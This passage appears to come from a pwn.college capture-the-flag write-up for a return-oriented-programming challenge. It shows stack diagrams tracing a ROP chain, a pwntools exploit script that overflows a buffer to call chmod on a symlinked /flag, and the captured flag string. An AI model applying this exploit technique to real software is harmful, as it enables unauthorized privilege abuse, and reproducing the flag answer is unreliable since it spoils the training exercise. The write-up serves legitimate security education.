+            0x7ffd2b5e9c58 │  00 00 00 00 00 00 00 5a  │ ( 90 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> challenge() return
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffd2b5e9c30 │  00 00 00 00 00 40 33 86  │ --> ( b"!\x00" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c38 │  00 00 00 00 00 40 20 21  │ --> ( pop rsi ; pop r15 ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c40 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c48 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c50 │  00 00 00 00 00 40 1d a0  │ --> ( pop rax ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c58 │  00 00 00 00 00 00 00 5a  │ ( 90 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop rdi
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffd2b5e9c38 │  00 00 00 00 00 40 20 21  │ --> ( pop rsi ; pop r15 ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c40 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c48 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c50 │  00 00 00 00 00 40 1d a0  │ --> ( pop rax ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c58 │  00 00 00 00 00 00 00 5a  │ ( 90 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x403389
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffd2b5e9c40 │  00 00 00 00 00 00 01 ff  │ ( 0o777 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c48 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c50 │  00 00 00 00 00 40 1d a0  │ --> ( pop rax ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c58 │  00 00 00 00 00 00 00 5a  │ ( 90 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x7ffd7804eba0
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop rsi
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffd2b5e9c48 │  42 42 42 42 42 42 42 42  │ ( b"BBBBBBBB" )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c50 │  00 00 00 00 00 40 1d a0  │ --> ( pop rax ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c58 │  00 00 00 00 00 00 00 5a  │ ( 90 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x7ffd7804eba0
+rsi: 0o777
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop r15
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffd2b5e9c50 │  00 00 00 00 00 40 1d a0  │ --> ( pop rax ; ret )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c58 │  00 00 00 00 00 00 00 5a  │ ( 90 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x7ffd7804eba0
+rsi: 0o777
+r15: b"BBBBBBBB"
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffd2b5e9c58 │  00 00 00 00 00 00 00 5a  │ ( 90 )
+                           ├╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌╌┤
+            0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x7ffd7804eba0
+rsi: 0o777
+r15: b"BBBBBBBB"
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> pop rax
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffd2b5e9c60 │  00 00 00 00 00 40 1d b0  │ --> ( syscall )
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x7ffd7804eba0
+rsi: 0o777
+r15: b"BBBBBBBB"
+rax: 90
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> ret
+═══════════════════════════════════════════════════════════════════════════════════
+
+Stack:
+                           ┌───────────────────────────┐
+    rsp --> 0x7ffd2b5e9c68 │  .. .. .. .. .. .. .. ..  │
+                           └───────────────────────────┘
+                           ╎  .. .. .. .. .. .. .. ..  ╎
+
+Registers:
+rdi: 0x7ffd7804eba0
+rsi: 0o777
+r15: b"BBBBBBBB"
+rax: 90
+
+═══════════════════════════════════════════════════════════════════════════════════
+rip --> syscall
+═══════════════════════════════════════════════════════════════════════════════════
+```
+
+### Exploit
+
+```
+hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:~$ ln -sf /flag ~/!
+```
+
+```py title="~/script.py" showLineNumbers
+from pwn import *
+
+# Initialize values
+pop_rax_ret_gadget = 0x401da0
+pop_rdi_ret_gadget = 0x401dc8
+pop_rsi_pop_r15_ret_gadget = 0x402021
+syscall_gadget = 0x401db0
+bang_addr = 0x403386
+
+buffer_addr = 0x7ffc3c96a300
+ret_addr = 0x7ffc3c96a348
+
+# Calculate offset
+const_offset = ret_addr - buffer_addr
+
+p = process('/challenge/stop-pop-and-rop2-easy')
+
+# Craft payload
+payload = b"A" * const_offset
+payload += p64(pop_rdi_ret_gadget)
+payload += p64(bang_addr)         
+payload += p64(pop_rsi_pop_r15_ret_gadget)
+payload += p64(0o777)  
+payload += b"B" * 8              
+payload += p64(pop_rax_ret_gadget)
+payload += p64(90)                  
+payload += p64(syscall_gadget)
+
+# Send the payload
+p.sendline(payload)
+p.interactive()
+```
+
+```
+hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:~$ python ~/script.py
+[+] Starting local process '/challenge/stop-pop-and-rop2-easy': pid 14667
+[*] Switching to interactive mode
+###
+### Welcome to /challenge/stop-pop-and-rop2-easy!
+###
+
+This challenge reads in some bytes, overflows its stack, and allows you to perform a ROP attack. Through this series of
+challenges, you will become painfully familiar with the concept of Return Oriented Programming!
+
+Received 137 bytes! This is potentially 8 gadgets.
+Let's take a look at your chain! Note that we have no way to verify that the gadgets are executable
+from within this challenge. You will have to do that by yourself.
+
++--- Printing 9 gadgets of ROP chain at 0x7ffc29589d78.
+| 0x0000000000401dc8: pop rdi ; ret  ; 
+| 0x0000000000403386: and dword ptr [rax], eax ; add dword ptr [rbx], ebx ; add edi, dword ptr [rbx] ; je 0x40338e ; add byte ptr [rax], al ; or eax, 0x98000000 ; fdiv st(7), st(0) ; 
+| 0x0000000000402021: pop rsi ; pop r15 ; ret  ; 
+| 0x00000000000001ff: (UNMAPPED MEMORY)
+| 0x4242424242424242: (UNMAPPED MEMORY)
+| 0x0000000000401da0: pop rax ; ret  ; 
+| 0x000000000000005a: (UNMAPPED MEMORY)
+| 0x0000000000401db0: syscall  ; ret  ; 
+| 0x00007ffc29589e0a: sub dword ptr [rdi + rsi*4], ecx ; retf 0x9fc7 ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; add dword ptr [rax], eax ; add byte ptr [rax], al ; add byte ptr [rax], al ; add byte ptr [rax], al ; cwde  ; sahf  ; pop rax ; sub esp, edi ; jg 0x7ffc29589e37 ; add byte ptr [rax - 0x3d6a762], ch ; jg 0x7ffc29589e3f ; add byte ptr [rax + 0x560bdb61], dl ; jl 0x7ffc29589e47 ; add byte ptr [rax], al ; 
+
+Leaving!
+[*] Process '/challenge/stop-pop-and-rop2-easy' stopped with exit code -11 (SIGSEGV) (pid 14667)
+[*] Got EOF while reading in interactive
+$ 
+```
+
+```
+hacker@return-oriented-programming~stop-pop-and-rop-ii-easy:~$ cat /flag 
+pwn.college{syRIf9w4Ac-DZiTHGLOc-VI3lcE.0VO0MDL4ITM0EzW}
 ```
